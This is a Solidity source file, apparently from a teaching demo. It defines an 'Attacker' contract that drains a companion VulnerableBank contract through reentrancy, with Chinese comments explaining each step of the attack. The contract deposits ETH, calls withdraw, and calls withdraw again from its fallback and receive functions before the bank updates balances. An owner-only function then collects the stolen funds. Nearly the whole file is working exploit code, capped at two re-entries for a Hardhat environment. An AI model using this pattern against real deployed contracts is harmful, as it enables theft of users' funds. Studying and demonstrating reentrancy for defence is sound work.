// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev 利用重入漏洞攻击 VulnerableBank 的攻击合约 - Polkadot Asset Hub 版本
 * 
 * 攻击原理：
 * 1. 先在银行存入一定金额（如 1 ETH）
 * 2. 调用 withdraw 取款
 * 3. 在 receive 函数中再次调用 withdraw
 * 4. 由于银行余额未更新，可以重复取款
 * 5. 直到银行余额耗尽
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRY = 2; // 限制最大重入次数（Hardhat 限制）
    
    // 事件：攻击开始
    event AttackStarted(uint256 amount);
    
    // 事件：攻击成功
    event AttackSucceeded(uint256 stolenAmount);
    
    // 事件：收到 ETH
    event ReceivedETH(uint256 amount, uint256 balance);
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev 发起攻击
     * 
     * 攻击步骤：
     * 1. 向银行存入 msg.value
     * 2. 立即调用 withdraw
     * 3. 触发重入攻击
     */
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        reentryCount = 0; // 重置计数器
        
        emit AttackStarted(msg.value);
        
        // 步骤 1: 存款
        vulnerableBank.deposit{value: msg.value}();
        
        // 步骤 2: 开始攻击 - 调用 withdraw
        vulnerableBank.withdraw(msg.value);
        
        emit AttackSucceeded(address(this).balance);
    }
    
    /**
     * @dev fallback 函数 - 重入攻击的核心
     * 
     * 当银行向攻击合约转账时，这个函数会被自动调用
     * 我们在这里再次调用 withdraw，形成重入攻击
     */
    fallback() external payable {
        emit ReceivedETH(msg.value, address(this).balance);
        
        reentryCount++;
        
        // 🔥 重入攻击的关键：再次调用 withdraw
        // 限制重入次数，避免 gas 耗尽
        if (reentryCount < MAX_REENTRY && address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev receive 函数 - 也处理纯转账
     */
    receive() external payable {
        emit ReceivedETH(msg.value, address(this).balance);
        
        reentryCount++;
        
        if (reentryCount < MAX_REENTRY && address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev 提取被盗的 ETH
     */
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev 查询攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev 查询银行余额
     */
    function getBankBalance() public view returns (uint256) {
        return address(vulnerableBank).balance;
    }
}
